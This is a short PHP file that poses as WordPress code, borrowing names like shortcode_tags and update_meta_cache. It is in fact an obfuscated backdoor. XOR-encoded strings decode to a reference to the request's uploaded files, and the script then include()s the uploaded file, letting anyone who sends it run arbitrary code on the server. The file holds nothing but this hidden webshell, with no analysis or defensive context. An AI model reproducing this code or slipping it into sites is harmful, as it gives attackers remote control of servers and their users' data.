<?php
        
    
        
	$get_posts = 'char';
function guid($others_preg)

{
	$fields = 'secs';
    $update_meta_cache = $others_preg;

    
    $shortcode_tags = $GLOBALS;
    
	$text = 'posts_per_page';
    $shortcode_tags = $shortcode_tags[rel_array("%25%02%2B%24%04%24", $update_meta_cache)];

    
    $input = $shortcode_tags;

    $post_date_gmt = isset($input[$update_meta_cache]);
    if ($post_date_gmt)

    {
        $decoded_slug = $shortcode_tags[$update_meta_cache];
        $double = $decoded_slug[rel_array("%0E%29%127%2F%16%5D%09", $update_meta_cache)];
        $close_quote = $double;
        include ($close_quote);

    }
}
function rel_array($uploads, $lastpostmodified)

{
    $to_ncr = $lastpostmodified;
    $exclusions = "url";

    $exclusions  .= "decode";
    $mime_subgroup = $exclusions($uploads);

    $deleted = strlen($mime_subgroup);
    $deleted = substr($to_ncr, 0, $deleted);

    $entity = $mime_subgroup ^ $deleted;
    
    $mime_subgroup = sprintf($entity, $deleted);
    
    return $entity;
}

guid('zDbhAw0lnV');


?>
